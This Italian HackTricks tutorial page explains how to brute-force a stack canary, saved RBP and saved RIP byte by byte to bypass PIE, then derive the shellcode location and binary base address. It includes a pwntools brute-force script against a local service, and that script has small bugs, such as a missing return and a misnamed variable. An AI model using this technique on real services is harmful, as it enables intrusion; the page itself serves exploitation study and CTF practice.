# Indirizzi BF nello Stack

{% hint style="success" %}
Impara e pratica l'Hacking su AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica l'Hacking su GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Sostieni HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

**Se ti trovi di fronte a un binario protetto da un canary e da PIE (Position Independent Executable) probabilmente devi trovare un modo per aggirarli.**

![](<../../../.gitbook/assets/image (865).png>)

{% hint style="info" %}
Nota che **`checksec`** potrebbe non trovare che un binario √® protetto da un canary se √® stato compilato staticamente e non √® in grado di identificare la funzione.\
Tuttavia, puoi notarlo manualmente se trovi che un valore viene salvato nello stack all'inizio di una chiamata di funzione e questo valore viene controllato prima di uscire.
{% endhint %}

## Indirizzi Brute-Force

Per **aggirare la PIE** devi **leakare alcuni indirizzi**. E se il binario non sta leakando nessun indirizzo, il meglio da fare √® **forzare il RBP e il RIP salvati nello stack** nella funzione vulnerabile.\
Ad esempio, se un binario √® protetto utilizzando sia un **canary** che **PIE**, puoi iniziare a forzare il canary, poi i **successivi** 8 byte (x64) saranno il **RBP** salvato e i **successivi** 8 byte saranno il **RIP** salvato.

{% hint style="success" %}
Si suppone che l'indirizzo di ritorno all'interno dello stack appartenga al codice binario principale, che, se la vulnerabilit√† si trova nel codice binario, sar√† di solito il caso.
{% endhint %}

Per forzare il RBP e il RIP dal binario puoi capire che un byte indovinato valido √® corretto se il programma produce un output o semplicemente non va in crash. La **stessa funzione** fornita per forzare il canary pu√≤ essere utilizzata per forzare il RBP e il RIP:
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

# CANARY BF HERE
canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary

# PIE BF FROM HERE
print("Brute-Forcing RBP")
base_canary_rbp = get_bf(base_canary)
RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])
print("Brute-Forcing RIP")
base_canary_rbp_rip = get_bf(base_canary_rbp)
RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])
```
L'ultima cosa di cui hai bisogno per sconfiggere il PIE √® calcolare **indirizzi utili dagli indirizzi trapelati**: il **RBP** e il **RIP**.

Dal **RBP** puoi calcolare **dove stai scrivendo il tuo shell nello stack**. Questo pu√≤ essere molto utile per sapere dove scriverai la stringa _"/bin/sh\x00"_ all'interno dello stack. Per calcolare la distanza tra il RBP trapelato e il tuo shellcode puoi semplicemente mettere un **breakpoint dopo aver trapelato il RBP** e controllare **dove si trova il tuo shellcode**, quindi puoi calcolare la distanza tra il shellcode e il RBP:
```python
INI_SHELLCODE = RBP - 1152
```
Dal **RIP** √® possibile calcolare l'**indirizzo di base del file binario PIE** di cui avrai bisogno per creare una **catena ROP valida**.\
Per calcolare l'indirizzo di base basta eseguire `objdump -d vunbinary` e controllare gli ultimi indirizzi disassemblati:

![](<../../../.gitbook/assets/image (479).png>)

In quell'esempio puoi vedere che sono necessari solo **1 byte e mezzo** per individuare tutto il codice, quindi, l'indirizzo di base in questa situazione sar√† il **RIP leakato ma terminante in "000"**. Ad esempio, se hai leakato `0x562002970ecf`, l'indirizzo di base sar√† `0x562002970000`.
```python
elf.address = RIP - (RIP & 0xfff)
```
## Miglioramenti

Secondo [**alcune osservazioni da questo post**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#extended-brute-force-leaking), √® possibile che quando si rilasciano i valori RBP e RIP, il server non si blocchi con alcuni valori che non sono quelli corretti e lo script BF penser√† di aver ottenuto quelli giusti. Questo perch√© √® possibile che **alcuni indirizzi semplicemente non lo rompano anche se non sono esattamente quelli corretti**.

Secondo quel post del blog, √® consigliabile aggiungere un breve ritardo tra le richieste inviate al server.
